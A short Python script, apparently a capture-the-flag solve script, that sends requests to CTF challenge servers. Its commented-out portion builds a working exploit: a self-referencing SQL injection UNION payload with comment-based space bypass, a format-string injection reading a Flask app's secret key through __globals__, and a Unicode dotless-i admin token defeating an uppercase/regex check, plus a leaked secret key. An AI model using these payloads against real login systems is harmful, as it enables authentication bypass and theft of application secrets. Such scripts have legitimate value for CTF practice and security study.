import requests
import re

# flag = '{flag.__str__.__globals__[app].secret_key}'
# # flag = "{flag.__init__.__globals__[app].secret_key}"
# l1 = len("'/**/UNION/**/SELECT/**/''/**/AS/**/username,/**/substr(s.q,/**/1,/**/)||quote(s.q)||substr(s.q,/**/)/**/AS/**/password/**/FROM/**/(SELECT/**/")
# l1 += len(flag)
# l1 += 6
# print(l1)

# password = "'/**/UNION/**/SELECT/**/'" + flag + "'/**/AS/**/username,/**/substr(s.q,/**/1,/**/"+ str(l1) +")||quote(s.q)||substr(s.q,/**/"+str(l1 + 5) +")/**/AS/**/password/**/FROM/**/(SELECT/**/'''/**/UNION/**/SELECT/**/''"+flag+"''/**/AS/**/username,/**/substr(s.q,/**/1,/**/"+str(l1)+")||quote(s.q)||substr(s.q,/**/" + str(l1 + 5) +")/**/AS/**/password/**/FROM/**/(SELECT/**/''%" + "s''/**/AS/**/q)/**/AS/**/s--'/**/AS/**/q)/**/AS/**/s--"


# body = {
#     'username': flag,
#     'password': password,
#     'token': "ADM\u0131N-E864E8E8F230374AA7B3B0CE441E209A"
# }

# print()
# print(body['username'])
# print(body['password'])
# print(body['token'])
# print(re.search('ADMIN', body['token']) == None)
# print(body['token'].upper() == 'ADMIN-E864E8E8F230374AA7B3B0CE441E209A')

# r = requests.post('http://eofqual.ais3.org:1977/login', data=body)
# print(r.text)

# secret_key = b'h\x16\xa5\xca\x88\xd9\x8e\x10i\x12\xde\x82ie\xcarL\x9f\r\xe8\xdf\xf5\x84\xb6\x03a3\xb4\xa8K\x94>'

# print(len(secret_key))

# print(secret_key)


s = f'http://chall.ctf.bamboofox.tw:9527/hey_guys_this_is_the_flag_route?give=225&me=235&flag=\x87'

r = requests.get(s)
print(r.text)
